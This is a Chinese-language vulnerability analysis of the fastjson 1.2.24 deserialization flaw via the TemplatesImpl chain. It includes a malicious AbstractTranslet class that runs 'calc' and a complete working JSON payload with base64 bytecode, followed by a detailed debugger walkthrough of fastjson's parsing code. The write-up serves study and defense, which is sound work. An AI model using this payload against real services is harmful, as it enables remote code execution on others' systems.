  * fastjson反序列化时，JSON字符串中的`@type`字段，用来表明指定反序列化的目标恶意对象类。
  * fastjson反序列化时，字符串时会自动调用恶意对象的构造方法，`set`方法，`get`方法，若这类方法中存在利用点，即可完成漏洞利用。
主要存在两种利用方式：
  * JdbcRowSetImpl(JNDI)
  * TemplatesImpl(Feature.SupportNonPublicField)
先讨论`TemplatesImpl`利用链
## 漏洞测试环境
  * Windows
  * Java(TM) SE Runtime Environment (build 1.8.0_112-b15)
  * fastjson 1.2.24
  * JSON.parseObject(payload, Feature.SupportNonPublicField);
恶意对象类：
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import java.io.IOException;
    public class poc_1 extends AbstractTranslet {
        public poc_1() throws IOException {
            Runtime.getRuntime().exec("calc");
        }
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
        public static void main(String[] args) throws Exception {
            poc_1 t = new poc_1();
        }
    }
`javac`编译成字节码，然后对字节码继续宁`base64`编码填充POC的`_bytecodes`字段。
POC：
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    public class java1_2_25 {
        public static void main(String[] args) {
            String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAKcG9jXzEuamF2YQwACAAJBwAhDAAiACMBAARjYWxjDAAkACUBAAVwb2NfMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAJAAQACgANAAsADAAAAAQAAQANAAEADgAPAAEACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAOAAEADgAQAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEQAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAATAAgAFAAMAAAABAABABQAAQAVAAAAAgAW\"],'_name':'c.c','_tfactory':{ },\"_outputProperties\":{},\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
            JSON.parseObject(payload, Feature.SupportNonPublicField);
        }
    }
## 浅析POC
POC中的利用链`TemplatesImpl`类的中的绝大多数成员变量是被`private`修饰，影响漏洞的主要是`_bytecodes` 和
`_outputProperties`
两个成员变量。因此在使用`JSON.parseObject`时需要传入`Feature.SupportNonPublicField`。
  * `@type` ：反序列化的恶意目标类型`TemplatesImpl`，FastJson最终会按照这个类反序列化得到实例
  * `_bytecodes`：继承`AbstractTranslet` 类的恶意类字节码，使用`Base64`编码。
  * `_outputProperties`：`TemplatesImpl`反序列化过程中会调用`getOutputProperties` 方法，导致`bytecodes`字节码成功实例化，造成命令执行。
  * `_name`：调用`getTransletInstance` 时会判断其是否为`null`，为`null`直接`return`，不会进入到恶意类的实例化过程；
  * `_tfactory`：`defineTransletClasses` 中会调用其`getExternalExtensionsMap` 方法，为`null`会出现异常；
## 利用链流程分析
com.alibaba.fastjson.JSON#parseObject(java.lang.String,
com.alibaba.fastjson.parser.Feature...)  
`parseObject`会还是会调用`parse`，一路跟还是到`parse`
com.alibaba.fastjson.JSON#parse(java.lang.String, int)  
创建了类型为`DefaultJSONParser`的`parser`变量，跟进该类的创建
com.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser(java.lang.String,
com.alibaba.fastjson.parser.ParserConfig, int)
调用了另一个构造函数，并传入了`JSONScanner`类的实例用于词法解析。
com.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser(java.lang.Object,
com.alibaba.fastjson.parser.JSONLexer,
com.alibaba.fastjson.parser.ParserConfig)
对JSON字符串的开头进行解析，发现是`{`开头，设置对应的`token`。
此时变量内容如下，继续跟进`parser.parse()`到关键点
com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object)
这里会根据前面的初始化`lexer.token()`为`12`，进入了对应的`case`分支，调用`parseObject`
### @type字段
com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map,
java.lang.Object)
`scanSymbol`函数从`JSON`文本中解析出`@type`键名
根据`@type`进入相对的分支，并使用`scanSymbol`函数解析出`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`键值
com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String,
java.lang.ClassLoader)
调用`TypeUtils.loadClass`加载恶意利用类并存入`clazz`。
将`clazz`传入`config.getDeserializer`并继续跟进到关键位置。
com.alibaba.fastjson.util.JavaBeanInfo#build
通过反射获取类中的全部方法，此时的调用栈为：
    build:130, JavaBeanInfo (com.alibaba.fastjson.util)
    createJavaBeanDeserializer:526, ParserConfig (com.alibaba.fastjson.parser)
    getDeserializer:461, ParserConfig (com.alibaba.fastjson.parser)
    getDeserializer:312, ParserConfig (com.alibaba.fastjson.parser)
    parseObject:367, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:137, JSON (com.alibaba.fastjson)
    parse:193, JSON (com.alibaba.fastjson)
    parseObject:197, JSON (com.alibaba.fastjson)
    main:13, java1_2_25
然后通过三个`for`循环筛选出符合条件的方法存入`fieldList`
筛选部分代码如下
满足条件的`setter`：
  * 函数名长度大于`4`且以`set`开头
  * 非静态函数
  * 返回类型为`void`或当前类
  * 参数个数为`1`个
满足条件的`getter`：
  * 函数名长度大于等于`4`
  * 非静态方法
  * 以`get`开头且第`4`个字母为大写
  * 无参数
  * 返回值类型继承自`Collection`或`Map`或`AtomicBoolean`或`AtomicInteger`或`AtomicLong`
可以看到有三个符合条件，最后作为参数传入`JavaBeanInfo`类的实例。
执行并返回到上层，并进入关键的函数`deserializer.deserialze`
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser,
java.lang.reflect.Type, java.lang.Object, java.lang.Object, int)
### _bytecodes字段
在解析处理`@type`字段的目标类后，通过`for`循环处理JSON文本中剩下的键值对，通过`scanSymbol`函数获取下个键名
最先获取到的是`_bytecodes`，作为参数传递`parseField`函数
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField
这里调用函数`smartMatch`处理键名，跟踪该函数
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch
将键名传入了`getFieldDeserializer`函数，跟踪该函数
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#getFieldDeserializer
会将键名和之前筛选的出的三个方法名称进行比较，`_bytecodes`不满足条件因此会返回`null`，并返回到`smartMatch`函数中
因为`fieldDeserializer`结果为`null`，会进入分支并去掉原键名中的`-`、删除开头的下划线等。
键名为`_bytecodes`时，处理后变为`bytecodes`，并再次调用`getFieldDeserializer`进行对比，但`bytecodes`依然会返回`null`。
再此分支创建对`DefaultFieldDeserializer`类型的`fieldDeserializer`进行赋值，并调用`fieldDeserializer.parseField`函数
com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField
然后调用`fieldValueDeserilizer.deserialze`函数对`_bytecodes`进行`base64`解码并赋值给`value`，这就是为什么POC中的`_bytecodes`包含的字节码需要`base64`编码。
com.alibaba.fastjson.parser.JSONScanner#bytesValue
`base64解码调用过程比较冗长，直接列出调用栈信息
    decodeBase64:478, IOUtils (com.alibaba.fastjson.util)
    bytesValue:112, JSONScanner (com.alibaba.fastjson.parser)
    deserialze:136, ObjectArrayCodec (com.alibaba.fastjson.serializer) [2]
    parseArray:723, DefaultJSONParser (com.alibaba.fastjson.parser)
    deserialze:177, ObjectArrayCodec (com.alibaba.fastjson.serializer) [1]
    parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:137, JSON (com.alibaba.fastjson)
    parse:193, JSON (com.alibaba.fastjson)
    parseObject:197, JSON (com.alibaba.fastjson)
    main:13, java1_2_25
继续调用`setValue`
com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object,
java.lang.Object)
将解码后的内容设置到对象中，此时的调用栈信息
    setValue:137, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:137, JSON (com.alibaba.fastjson)
    parse:193, JSON (com.alibaba.fastjson)
    parseObject:197, JSON (com.alibaba.fastjson)
    main:13, java1_2_25
层层返回
执行到`deserialze:614, JavaBeanDeserializer
(com.alibaba.fastjson.parser.deserializer)`跳出当前循环，进入外部的下一次的`for`循环`deserialze:349,
JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)`
### _outputProperties字段
在大循环中`JSON`文本中的每个键值对都会进行分析处理，继续分析关键的`outputProperties`流程
deserialze:474, JavaBeanDeserializer
(com.alibaba.fastjson.parser.deserializer)
然后将键名`_outputProperties`传入`smartMatch`，下划线会被去掉变为`key2`，符合`sortedFieldDeserializers`中的三个元素，返回`fieldDeserializer`。
POC中键名为`outputProperties`也是可以的，`smartMatch(key)`就能返回`fieldDeserializer`，一路步进至`setValue`处。
这里会利用反射调用`outputProperties`的`get`方法`public synchronized java.util.Properties
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()`
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance
首先对`_name`进行判断并不能为空，然后调用`defineTransletClasses`函数
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses
使用了`loader.defineClass`加载了恶意对象的字节码，然后获取父类赋值到`superClass`，`superClass.getName().equals`父类是否为`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`
返回到上层函数，`_class[_transletIndex].newInstance()`创建恶意对象实例。
java.lang.Class#newInstance
这里直接无参数实例化了，调用了恶意类的构造函数完成代码执行。  
当前调用栈
    newInstance:410, Constructor (java.lang.reflect)
    newInstance:442, Class (java.lang)
    getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:137, JSON (com.alibaba.fastjson)
    parse:193, JSON (com.alibaba.fastjson)
    parseObject:197, JSON (com.alibaba.fastjson)
    main:13, java1_2_25
# 参考
[https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/#Fastjson-TemplatesImpl-利用链](https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-利用链/#Fastjson-TemplatesImpl-利用链)
[https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/](https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/)
[https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/](https://mntn0x.github.io/2020/04/07/Fastjson漏洞复现/)